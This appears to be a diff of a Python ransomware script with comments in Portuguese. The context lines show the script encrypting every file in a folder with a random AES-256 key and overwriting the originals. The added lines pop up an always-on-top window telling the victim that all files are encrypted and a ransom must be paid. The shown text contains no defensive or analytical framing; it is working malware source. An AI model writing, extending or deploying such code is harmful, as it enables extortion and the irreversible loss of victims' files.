@@ -3,6 +3,18 @@ import secrets
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES
 import pickle
+#Adicionado biblioteca Tkinter para abrir janela de aviso
+import tkinter as tk
+from tkinter import messagebox
+
+#Função para adicionar janela de aviso de descriptografia dos arquivos
+def show_encryption_message():
+    root = tk.Tk()
+    root.attributes('-topmost', True)  # Traz a janela para o primeiro plano
+    root.withdraw()  # Esconde a janela principal do tkinter
+    messagebox.showwarning("ATENÇÃO", "Todos os seus arquivos foram criptografados!\nPara resgatá-los pague o resgate")
+    root.destroy()
+
 
 # Gere uma chave AES de 256 bits (32 bytes)
 key = secrets.token_bytes(32)
@@ -31,3 +43,6 @@ for arquivo in arquivos:
             dados_criptografados = cipher.encrypt(dados)
         with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_criptografado:
             arquivo_criptografado.write(dados_criptografados)
+
+# Chama da função para abrir a janela de Aviso
+show_encryption_message()
